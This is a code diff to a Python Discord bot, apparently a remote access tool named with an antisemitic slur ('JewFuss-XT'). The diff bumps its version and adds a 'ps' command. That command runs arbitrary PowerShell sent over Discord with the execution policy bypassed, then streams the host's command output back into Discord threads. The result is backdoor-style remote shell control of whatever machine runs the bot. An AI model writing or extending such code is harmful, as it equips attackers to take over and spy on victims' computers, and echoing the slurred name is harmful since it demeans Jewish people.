@@ -43,7 +43,7 @@ import os
 import re
 
 TOKEN = "bot token" # Do not remove or modify this comment (easy compiler looks for this) - 23r98h
-version = "1.0.3.8" # Replace with current JewFuss-XT version (easy compiler looks for this to check for updates, so DO NOT MODIFY THIS COMMENT) - 25c75g
+version = "1.0.3.9" # Replace with current JewFuss-XT version (easy compiler looks for this to check for updates, so DO NOT MODIFY THIS COMMENT) - 25c75g
 
 FUCK = hashlib.md5(uuid.uuid4().bytes).digest().hex()[:6]
 
@@ -557,6 +557,107 @@ async def cmd(ctx, *, command: str = None):
                 current_datetime = datetime.datetime.now().strftime("-%S")
                 base = (command or "")[:100 - len(current_datetime)]
                 name = f"{base}{current_datetime}" or "cmd-output"
+                if first_output and len(f"**Output:**\n{first_output}") <= 2000:
+                    msg = await ctx.send(f"**Output:**\n{first_output}")
+                else:
+                    buf = io.BytesIO((f"**Output:**\n{first_output}" if first_output else "**Output:**").encode("utf-8"))
+                    msg = await ctx.send(file=discord.File(fp=buf, filename="command_output.txt"))
+                thread = await msg.create_thread(name=name)
+
+        async def flush(force=False):
+            nonlocal pending, pending_len, last_flush
+            if not pending:
+                return
+            if not force and (_t.monotonic() - last_flush) < FLUSH_INTERVAL and pending_len < MAX_MSG:
+                return
+            await ensure_thread()
+            chunk = "\n".join(pending)
+            if len(chunk) > 2000:
+                data = io.BytesIO(chunk.encode("utf-8"))
+                await thread.send(file=discord.File(fp=data, filename="command_output.txt"))
+            else:
+                await thread.send(chunk)
+            pending.clear()
+            pending_len = 0
+            last_flush = _t.monotonic()
+
+        while True:
+            line = process.stdout.readline()
+            if line == "" and process.poll() is not None:
+                break
+            if not line:
+                await asyncio.sleep(0.02)
+                await flush()
+                continue
+
+            s = line.rstrip("\r\n")
+            if not s:
+                continue
+
+            if first_output is None:
+                first_output = s
+                continue
+
+            if len(s) > 2000:
+                await ensure_thread()
+                data = io.BytesIO(s.encode("utf-8"))
+                await thread.send(file=discord.File(fp=data, filename="line_output.txt"))
+                continue
+
+            pending.append(s)
+            pending_len += len(s) + 1
+            if pending_len >= MAX_MSG:
+                await flush(force=True)
+            elif (_t.monotonic() - last_flush) >= FLUSH_INTERVAL:
+                await flush()
+
+        if first_output and thread is None:
+            await ctx.send(f"**Output:**\n{first_output}")
+
+        await flush(force=True)
+
+    except Exception as e:
+        await ctx.send(f"Error executing command: {e}")
+
+@bot.command(help="Runs a command in PowerShell and streams output live")
+async def ps(ctx, *, command: str = None):
+    if not command or not command.strip():
+        await ctx.send("Command cannot be empty.")
+        return
+
+    try:
+        ps_exe = shutil.which("pwsh") or shutil.which("powershell") or "powershell"
+        ps_boot = "[Console]::OutputEncoding = New-Object System.Text.UTF8Encoding($false); $OutputEncoding = [Console]::OutputEncoding;"
+        ps_cmd = [
+            ps_exe, "-NoLogo", "-NoProfile", "-ExecutionPolicy", "Bypass",
+            "-Command", f"{ps_boot}; & {{ {command} }} 2>&1"
+        ]
+
+        process = subprocess.Popen(
+            ps_cmd,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.STDOUT,
+            text=True,
+            encoding="utf-8",
+            errors="replace"
+        )
+
+        thread = None
+        first_output = None
+        pending = []
+        pending_len = 0
+        MAX_MSG = 1900
+        FLUSH_INTERVAL = 0.7
+
+        import time as _t
+        last_flush = _t.monotonic()
+
+        async def ensure_thread():
+            nonlocal thread, first_output
+            if thread is None:
+                current_datetime = datetime.datetime.now().strftime("-%S")
+                base = (command or "")[:100 - len(current_datetime)]
+                name = f"{base}{current_datetime}" or "ps-output"
                 if first_output and len(f"**Output:**\n{first_output}") <= 2000:
                     msg = await ctx.send(f"**Output:**\n{first_output}")
                 else:
